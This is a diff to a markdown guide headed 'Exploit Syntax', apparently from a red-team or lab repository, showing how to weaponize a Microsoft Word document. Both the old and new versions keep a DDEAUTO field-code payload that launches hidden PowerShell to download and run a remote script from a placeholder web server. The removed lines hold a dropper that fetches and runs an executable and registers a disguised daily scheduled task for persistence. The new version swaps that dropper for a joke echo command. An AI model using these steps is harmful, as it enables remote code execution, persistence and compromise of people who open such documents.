@@ -2,24 +2,14 @@
 
 ## Exploit Syntax: 
 
-1. Create a txt file named `stage2.txt`
-
-    ```sh
-    subl ~/cyber_gambit/resources/malware/stage2.txt
-    ```
-2. Paste in the powershell below and make edits as necessary.
+1. Create a file called /tmp/gross.txt
 
    ```powershell
-   $url = "<Malicious Payload download IP/URI>"
-   $outpath = "C:\Program Files\WindowsPowerShell\exe.exe"
-   iwr -uri $url -outfile $outpath
-   start-process -filepath $outpath
-   $action = New-ScheduledTaskAction -Execute $outpath
-   $trigger = New-ScheduledTaskTrigger -Daily -At 8am
-   Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Valid Schedule" -Description "This task verifies all functions are activated in valid order."
+   echo "Rick: Is that Mountain Dew in my quantum transport solution?        Morty: I-I saw you were marking the levels so I had to top it off        Rick: Top it off? Do you know how dangerously toxic this stuff is? And you added it to my portal fluid?" > c:\users\Portal.txt
    ```
-  > NOTE: Any varibles above can be changed out. 
-3. Open a Microsoft Word Document
+2. Host the file on posh as a text/html
+
+3. Open a Microsoft Word Document on a Windows machine
 
 4. Navigate to the tool bar the at top and select the insert tab
 
@@ -32,7 +22,7 @@
 
 6. Right Click toggle field codes and paste the contents below within the `{}` :
     ```powershell 
-    { DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://[webserver ip:port]/[saved ps1 file].ps1');powershell $e # " "for security reasons"}
+    { DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://[webserver ip:port]/[saved ps1 file].ps1');powershell $e # " "Oooohwee!"}
     ```
     > NOTE: Nake sure to set your url and file name 
 
